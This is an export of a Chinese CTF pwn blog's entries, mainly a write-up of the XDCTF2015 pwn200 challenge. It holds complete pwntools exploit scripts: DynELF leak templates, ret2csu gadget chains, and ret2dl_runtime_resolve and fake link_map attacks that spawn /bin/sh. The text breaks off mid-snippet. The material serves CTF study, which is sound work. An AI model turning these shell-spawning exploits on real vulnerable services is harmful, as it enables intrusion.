href="https://blog.csdn.net/A951860555/article/details/115462494">详参</a></p><h2 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h2><p><a href="https://blog.csdn.net/A951860555/article/details/115766826">https://blog.csdn.net/A951860555/article/details/115766826</a></p><h2 id="Hook函数劫持应用"><a href="#Hook函数劫持应用" class="headerlink" title="Hook函数劫持应用"></a>Hook函数劫持应用</h2><p><a href="https://forum.butian.net/share/437">pwn时劫持通过劫持各种hook从而劫持程序控制流的技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零碎知识点</title>
      <link href="/2023/04/18/ling-sui-zhi-shi-dian/"/>
      <url>/2023/04/18/ling-sui-zhi-shi-dian/</url>
      
        <content type="html"><![CDATA[<h2 id="题目防护措施"><a href="#题目防护措施" class="headerlink" title="题目防护措施"></a>题目防护措施</h2><h3 id="RELRO（重定位只读）"><a href="#RELRO（重定位只读）" class="headerlink" title="RELRO（重定位只读）"></a>RELRO（重定位只读）</h3><p><code>主要针对 GOT 改写的攻击方式</code></p><p>分为Partial RELRO 和 Full RELRO 两种</p><ul><li><p>Partial RELRO:在程序装入后，将其中一段 (如.dynamic) 标记为只读，防止程序的一些重定位信息被修改</p></li><li><p>Full RELRO: 在Partial RELRO的基础上，在程序装入时，直接解析完所有符号并填入对应的值，此时所有的 GOT 表项都已初始化，且不装入 link_map 与_dl_runtime_resolve 的地址 (二者都是程序动态装载的重要结构和函数)。</p></li></ul><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）攻击。RELRO 为” Partial RELRO”, 说明我们对 GOT 表具有写权限。</p><p><a href="https://lantern.cool/note-pwn-linux-protect/">参考</a></p><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>后门的意思就是攻击者在系统中隐藏一个可以被触发的点，当某些比较少见的特定操作发生之后，会触发一个动作，这个动作一般是打开一个端口让攻击者通过网络连接进系统，从而对系统进行控制。后门最重要的特点是隐蔽，不容易被杀毒软件检查出来。</p><h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><p><a href="https://www.cnblogs.com/love-jelly-pig/p/8471206.html">https://www.cnblogs.com/love-jelly-pig/p/8471206.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux动态链接</title>
      <link href="/2023/04/16/linux-dong-tai-lian-jie/"/>
      <url>/2023/04/16/linux-dong-tai-lian-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="plt-amp-got"><a href="#plt-amp-got" class="headerlink" title="plt&amp;got"></a>plt&amp;got</h2><p><a href="https://blog.csdn.net/linyt/category_6267121.html">参考</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux动态链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XDCTF2015-pwn200</title>
      <link href="/2023/04/16/xdctf2015-pwn200/"/>
      <url>/2023/04/16/xdctf2015-pwn200/</url>
      
        <content type="html"><![CDATA[<h1 id="一-DynELF方法"><a href="#一-DynELF方法" class="headerlink" title="一.DynELF方法"></a>一.DynELF方法</h1><p>具体参考：<br><a href="https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/">https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/</a><br><a href="https://www.anquanke.com/post/id/85129">https://www.anquanke.com/post/id/85129</a></p><h2 id="1-DynELF简介"><a href="#1-DynELF简介" class="headerlink" title="1.DynELF简介"></a>1.DynELF简介</h2><h3 id="1-1前言"><a href="#1-1前言" class="headerlink" title="1.1前言"></a>1.1前言</h3><p>在没有目标系统文件的情况下，可以通过使用pwntools的DynELF模块来泄露地址信息，从而获取到shell.</p><h3 id="1-2基本原理"><a href="#1-2基本原理" class="headerlink" title="1.2基本原理"></a>1.2基本原理</h3><p>DynELF 技术的原理是通过动态加载和链接共享库，并使用 dlsym() 函数查找共享库中的符号，从而实现程序的灵活性和可扩展性。在 CTF 中，我们可以利用 DynELF 来解决一些和导入表相关的问题，例如查找加密函数的地址、解密字符串等。<br>主要使用条件：<br>1）目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；<br>2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</p><h3 id="1-3代码模板"><a href="#1-3代码模板" class="headerlink" title="1.3代码模板"></a>1.3代码模板</h3><h4 id="1-3-1基本模板"><a href="#1-3-1基本模板" class="headerlink" title="1.3.1基本模板"></a>1.3.1基本模板</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./xxx'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#各种预处理</span>  payload <span class="token operator">=</span> <span class="token string">"xxxxxxxx"</span> <span class="token operator">+</span> address <span class="token operator">+</span> <span class="token string">"xxxxxxxx"</span>  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment">#各种处理</span>  data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  log<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token punctuation">(</span>data <span class="token keyword">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> datad <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span> elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment">#初始化DynELF模块 </span>systemAddress <span class="token operator">=</span> d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'libc'</span><span class="token punctuation">)</span>  <span class="token comment">#在libc文件中搜索system函数的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-3-2基于puts的模板"><a href="#1-3-2基于puts的模板" class="headerlink" title="1.3.2基于puts的模板"></a>1.3.2基于puts的模板</h4><p>puts遇到“\x00”会中断，并且会在字符串结尾自动加上’\n’，非常不适合leak函数。</p><p>64位：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>     payload <span class="token operator">=</span> padding <span class="token operator">+</span> fake_rbp    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>     payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_address<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>     p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">)</span>    count <span class="token operator">=</span> <span class="token number">0</span>     data <span class="token operator">=</span> <span class="token string">''</span>     up <span class="token operator">=</span> <span class="token string">""</span>     <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>         count <span class="token operator">+=</span> <span class="token number">1</span>         <span class="token keyword">if</span> up <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token keyword">and</span> c <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>             data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>             data <span class="token operator">+=</span> <span class="token string">"\x00"</span>            <span class="token keyword">break</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>             data <span class="token operator">+=</span> c         up <span class="token operator">=</span> c     data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'%x -> %s'</span><span class="token operator">%</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>32位：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>  count <span class="token operator">=</span> <span class="token number">0</span>  data <span class="token operator">=</span> <span class="token string">''</span>  payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret_address<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>address<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token keyword">print</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">)</span>   up <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>     count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">if</span> up <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token keyword">and</span> c <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        buf <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                   buf <span class="token operator">+=</span> <span class="token string">"\x00"</span>      <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      buf <span class="token operator">+=</span> c    up <span class="token operator">=</span> c  data <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'%x -> %s'</span><span class="token operator">%</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据接收那里很容易出问题，并且必须要有“ p.recvuntil(‘xxxx’) ”</p><p>因为程序在运行的过程中会输出一些字符串，可能会干扰数据接收的过程</p><h4 id="1-3-3基于write的模板"><a href="#1-3-3基于write的模板" class="headerlink" title="1.3.3基于write的模板"></a>1.3.3基于write的模板</h4><p>64位：</p><pre class="line-numbers language-none"><code class="language-none">def leak(addr):     payload &#x3D; padding + fake_rbp    payload +&#x3D; p64(pop_rdi_ret) + p64(1)    payload +&#x3D; p64(pop_rsi_ret) + p64(addr)    payload +&#x3D; p64(pop_rdx_ret) + p64(8)    payload +&#x3D; p64(write_plt) + p64(ret_address)    p.send(payload)    p.recvuntil(&#39;xxxx&#39;)    data &#x3D; p.recv(8)    log.success(&#39;%x -&gt; %s&#39;%(addr,hex(u64(data))))    return datad &#x3D; DynELF(leak,elf &#x3D; elf)function_libc &#x3D; d.lookup(&#39;function&#39;,&#39;libc&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>32位：</p><pre class="line-numbers language-none"><code class="language-none">def leak(address):    payload &#x3D; padding + fake_rbp    payload +&#x3D; p32(write_plt) + p32(ret_address)     payload +&#x3D; p32(1) + p32(address) + p32(4)    p.sendline(payload)    p.recvuntil(&#39;xxxx&#39;)    data &#x3D; p.recv(4)     log.success(&#39;%x -&gt; %s&#39;%(address,hex(u32(data))))    return datad &#x3D; DynELF(leak,elf &#x3D; elf)function_libc &#x3D; d.lookup(&#39;function&#39;,&#39;libc&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配合万能pop，代码如下：</p><pre class="line-numbers language-none"><code class="language-none">def leak(addr):     csu(0, 1, write_got, 8, addr, 1, main_addr)    p.recvuntil(&#39;xxxx&#39;)     data &#x3D; p.recv(8)    log.info(&quot;%#x &#x3D;&gt; %s&quot; % (addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))     return data#当然，配合puts也是可以的（puts和write就只有接收部分不同）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-3-4-补充：万能pop模板"><a href="#1-3-4-补充：万能pop模板" class="headerlink" title="1.3.4 补充：万能pop模板"></a>1.3.4 补充：万能pop模板</h4><p>当程序的常规gadgets不能满足需求时（通常是缺少“pop_rdx”），就需要万能pop<br>如果用csu进行寄存器赋值，需要两个重要的ROPgadgets：</p><p>csu_front_addr:<br><img src="https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126255915-1642995722008-1647496563602.png"><br>csu_end_addr:<br><img src="https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126386447-1642995722010-1647496563602.png"></p><p><code>不同的程序csu可能不同（寄存器顺序不同），一定要确认并修改</code></p><pre class="line-numbers language-none"><code class="language-none">csu_front_addr&#x3D;csu_end_addr&#x3D;def csu(rbx, rbp, r12, r13, r14, r15, last):    # pop rbx,rbp,r12,r13,r14,r15    # rbx should be 0,    # rbp should be 1,enable not to jump    # r12 should be the function we want to call(只能是got表地址)    # rdi&#x3D;edi&#x3D;r15d    # rsi&#x3D;r14    # rdx&#x3D;r13    # csu(0, 1, fun_got, rdx, rsi, rdi, last)    payload &#x3D; padding + fake_ebp    payload +&#x3D; p64(csu_end_addr)     payload +&#x3D; p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)    payload +&#x3D; p64(csu_front_addr)    payload +&#x3D; b&#39;a&#39; * 0x38    payload +&#x3D; p64(last)    p.send(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fun_got也可以是指向函数首地址的指针</p><p>例子：</p><pre class="line-numbers language-none"><code class="language-none">csu(0, 1, write_got, 8, bss_addr, 1, main_addr)#执行write(1,bss_addr,8)后，执行main_addrcsu(0, 1, read_got, 8, bss_addr, 0, main_addr)#执行read(0,bss_addr,8)后，执行main_addr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2.解题思路"></a>2.解题思路</h2><p>checksec下32位，除了canary没开，其他保护全开。</p><p>借助DynELF实现利用的点：<br>1）调用write函数来泄露地址信息，比较方便；<br>2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；<br>3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；<br>4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</p><h3 id="dynelf-exp-32位）"><a href="#dynelf-exp-32位）" class="headerlink" title="dynelf exp(32位）"></a>dynelf exp(32位）</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *p &#x3D; process(&quot;.&#x2F;XDCTF_2015_pwn200&quot;)elf &#x3D; ELF(&quot;.&#x2F;XDCTF_2015_pwn200&quot;)write_plt &#x3D; elf.symbols[&#39;write&#39;]ret_addr &#x3D; 0x080484B  #vuln_addrstart_addr &#x3D; 0x080483D0read_plt &#x3D; elf.symbols[&#39;read&#39;]ppp_ret_addr &#x3D; 0x0804856Cbss_addr &#x3D; 0x0804A020#用来写入&#39;&#x2F;bin&#x2F;sh&#39;def leak(addr):    payload1 &#x3D; b&#39;A&#39; * 108 + b&quot;BBBB&quot;    payload1 +&#x3D; p32(write_plt) + p32(ret_addr)    payload1 +&#x3D; p32(1) + p32(addr) + p32(4)    p.send(payload1)    data &#x3D; p.recv(4)    log.success(&#39;%x -&gt; %s&#39;%(addr,hex(u32(data))))    return dataprint p.recvline()d &#x3D; DynELF(leak,elf &#x3D; ELF(&quot;.&#x2F;XDCTF_2015_pwn200&quot;))sys_addr &#x3D; d.lookup(&quot;system&quot;, &quot;libc&quot;)print &quot;system address:&quot;, hex(sys_addr)#调用_start函数，恢复栈payload2 &#x3D; b&#39;A&#39; * 112 + p32(start_addr)p.send(payload2)p.recv()payload3 &#x3D; b&#39;A&#39; * 112 + p32(read_plt) + p32(ppp_ret_addr) +         p32(0) + p32(bss_addr) + p32(8) +         p32(sys_addr) + p32(ret_addr) + p32(bss_addr)p.send(payload3)p.send(&#39;&#x2F;bin&#x2F;sh&#39;)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="万能pop模板-dynelf-exp（64位）"><a href="#万能pop模板-dynelf-exp（64位）" class="headerlink" title="万能pop模板+dynelf exp（64位）"></a>万能pop模板+dynelf exp（64位）</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *p&#x3D;process(&#39;.&#x2F;main_partial_relro_64&#39;)elf&#x3D;ELF(&#39;.&#x2F;main_partial_relro_64&#39;)#context(log_level&#x3D;&#39;debug&#39;,arch&#x3D;&#39;amd64&#39;)write_got&#x3D;elf.got[&#39;write&#39;]read_got&#x3D;elf.got[&#39;read&#39;]main_addr&#x3D;0x40066Efun_addr&#x3D;0x400637 bss_addr&#x3D;0x601050+0x200csu_front_addr&#x3D;0x000000000400780csu_end_addr&#x3D;0x00000000040079A print(&quot;write_got &gt;&gt; &quot;+hex(write_got))def csu(rbx, rbp, r12, r13, r14, r15, last):    payload &#x3D; b&#39;a&#39;*0x70 + b&#39;b&#39;*0x8    payload +&#x3D; p64(csu_end_addr)     payload +&#x3D; p64(rbx) + p64(rbp)+p64(r12) +p64(r13)+p64(r14)+p64(r15)    payload +&#x3D; p64(csu_front_addr)    payload +&#x3D; b&#39;a&#39; * 0x38    payload +&#x3D; p64(last)    p.send(payload)    sleep(1)def leak(addr):p.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)csu(0, 1, write_got, 1, addr, 8, main_addr)data&#x3D;p.recv(8)log.info(&quot;%#x &#x3D;&gt; %s&quot; % (addr, (data or &#39;&#39;).encode(&#39;hex&#39;))) return datad&#x3D;DynELF(leak,elf&#x3D;elf)execve_addr&#x3D;d.lookup(&#39;execve&#39;,&#39;libc&#39;)print(&quot;execve_addr: &quot;+hex(execve_addr))payload&#x3D;p64(execve_addr)+b&#39;&#x2F;bin&#x2F;sh&#39;csu(0, 1, read_got, 0, bss_addr, len(payload), main_addr)p.send(payload)csu(0, 1, bss_addr, bss_addr+8, 0, 0, main_addr)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://ywhkkx.github.io/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/">原文</a></p><h1 id="二-ret2-dl-runtime-resolve方法"><a href="#二-ret2-dl-runtime-resolve方法" class="headerlink" title="二.ret2_dl_runtime_resolve方法"></a>二.ret2_dl_runtime_resolve方法</h1><blockquote><p>详参：<br><a href="https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502">holly</a><br><a href="https://ywhkkx.github.io/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">yhello</a></p></blockquote><h2 id="exp-（32位）"><a href="#exp-（32位）" class="headerlink" title="exp:（32位）"></a>exp:（32位）</h2><pre class="line-numbers language-none"><code class="language-none">from pwn import *elf &#x3D; ELF(&#39;main&#39;)r &#x3D; process(&#39;.&#x2F;main&#39;)rop &#x3D; ROP(&#39;.&#x2F;main&#39;)offset &#x3D; 112bss_addr &#x3D; elf.bss() #获取bss段首地址r.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)## 将栈迁移到bss段## 新栈空间大小为0x800stack_size &#x3D; 0x800base_stage &#x3D; bss_addr + stack_size ### 填充缓冲区rop.raw(&#39;a&#39; * offset) ### 向新栈中写100个字节##rop.read会自动完成read函数、函数参数、返回地址的栈部署rop.read(0, base_stage, 100)### 栈迁移, 设置esp &#x3D; base_stage##rop.migrate会利用leave_ret自动部署迁移工作rop.migrate(base_stage)r.sendline(rop.chain())# &quot;&#x2F;bin&#x2F;sh&quot;字符串rop &#x3D; ROP(&#39;.&#x2F;main&#39;)sh &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;#获取plt0的基地址plt0 &#x3D; elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr#获取.rel.plt的基地址rel_plt &#x3D; elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addr#获取.dynsym的基地址dynsym &#x3D; elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addr#获取.dynstr的基地址dynstr &#x3D; elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr## 在base_stage + 32的地方开始部署.dynsym结构体fake_sym_addr &#x3D; base_stage + 32## 对齐align &#x3D; 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr &#x3D; fake_sym_addr + align## 计算.dynsym结构体下标index_dynsym &#x3D; (fake_sym_addr - dynsym) &#x2F; 0x10## 计算.dynstr偏移准备更改.dynsym成员变量st_namest_name &#x3D; fake_sym_addr + 0x10 - dynstrfake_write_sym &#x3D; flat([st_name, 0, 0, 0x12])# 伪造的.dynsym结构体# 在 base_stage+24的位置开始部署.rel.plt的结构体index_offset &#x3D; base_stage + 24 - rel_pltwrite_got &#x3D; elf.got[&#39;write&#39;]# 由.dynsym结构体下标反推r_infor_info &#x3D; (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc &#x3D; flat([write_got, r_info])rop.raw(plt0)rop.raw(index_offset)# fake ret addr of writerop.raw(&#39;bbbb&#39;) #system函数返回地址rop.raw(base_stage + 82) #system函数1参rop.raw(&#39;bbbb&#39;) #原write函数2参rop.raw(&#39;bbbb&#39;) #原write函数3参rop.raw(fake_write_reloc)  # 伪造的.rel.plt的结构体rop.raw(&#39;a&#39; * align)  # 对齐rop.raw(fake_write_sym)  # 伪造的.dynsym的结构体rop.raw(&#39;system\x00&#39;) #伪造的.dynstrrop.raw(&#39;a&#39; * (80 - len(rop.chain())))rop.raw(sh)rop.raw(&#39;a&#39; * (100 - len(rop.chain())))#print rop.dump() 可打印栈布局r.sendline(rop.chain())r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="基于模板的exp（64位）"><a href="#基于模板的exp（64位）" class="headerlink" title="基于模板的exp（64位）"></a>基于模板的exp（64位）</h2><p>如果题目中给出了libc版本，就可以用这个方法（泄露出libc版本后也行）</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *  context(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;amd64&#39;,log_level&#x3D;&#39;debug&#39;)r &#x3D; process(&#39;.&#x2F;main_partial_relro_64&#39;)  elf &#x3D; ELF(&#39;.&#x2F;main_partial_relro_64&#39;)  libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so&#39;) #程序使用这个库文件read_plt &#x3D; elf.plt[&#39;read&#39;]  write_got &#x3D; elf.got[&#39;write&#39;]  vuln_addr &#x3D; elf.sym[&#39;vuln&#39;]    bss &#x3D; 0x601050  bss_stage &#x3D; bss + 0x100l_addr &#x3D;  libc.sym[&#39;system&#39;] -libc.sym[&#39;write&#39;]  #目标函数和已知函数的偏移（把‘write’重定位成‘system’）  pop_rdi &#x3D; 0x4007a3  pop_rsi &#x3D; 0x4007a1 plt_load &#x3D; 0x400506 #plt[1](dl_runtime_resolve)def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):    #offset为负数，可以用‘(2 ** 64 - 1)’来控制范围     linkmap &#x3D; p64(offset &amp; (2 ** 64 - 1))    linkmap +&#x3D; p64(0)     linkmap +&#x3D; p64(fake_linkmap_addr + 0x18)    linkmap +&#x3D; p64((fake_linkmap_addr + 0x30 - offset) &amp; (2 ** 64 - 1))     linkmap +&#x3D; p64(0x7)     linkmap +&#x3D; p64(0)    linkmap +&#x3D; p64(0)    linkmap +&#x3D; p64(0)    linkmap +&#x3D; p64(known_func_ptr - 0x8)     linkmap +&#x3D; b&#39;&#x2F;bin&#x2F;sh\x00&#39;    linkmap &#x3D; linkmap.ljust(0x68,b&#39;A&#39;)    linkmap +&#x3D; p64(fake_linkmap_addr)     linkmap +&#x3D; p64(fake_linkmap_addr + 0x38)     linkmap &#x3D; linkmap.ljust(0xf8,b&#39;A&#39;)    linkmap +&#x3D; p64(fake_linkmap_addr + 0x8)    return linkmap#fake_linkmap_addr：可以控制的地址#known_func_ptr：function_got（已知函数的GOT表地址）#offset：system_got - function_gotfake_link_map &#x3D; fake_Linkmap_payload(bss_stage, write_got ,l_addr)payload &#x3D; flat( &#39;a&#39; * 120 ,pop_rdi, 0 , pop_rsi , bss_stage , 0 , read_plt , pop_rsi , 0 ,0 , pop_rdi , bss_stage + 0x48  , plt_load , bss_stage , 0 )&quot;&quot;&quot;read_plt触发时输入‘fake_link_map’，plt_load就是dl_runtime_resolve，控制程序手段执行dl_runtime_resolve，此时‘bss_stage’被当做第一个参数，‘0’被当做第二个参数&quot;&quot;&quot;r.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)  r.sendline(payload)  r.send(fake_link_map) #把write重定位为systemr.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://ywhkkx.github.io/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/">原文</a></p><p>&#x2F;&#x2F;PS:</p><blockquote><p>为什么程序会调用“aaaa”呢？</p></blockquote><pre class="line-numbers language-none"><code class="language-none">stack_size &#x3D; 0x800base_stage &#x3D; bss_addr + stack_size 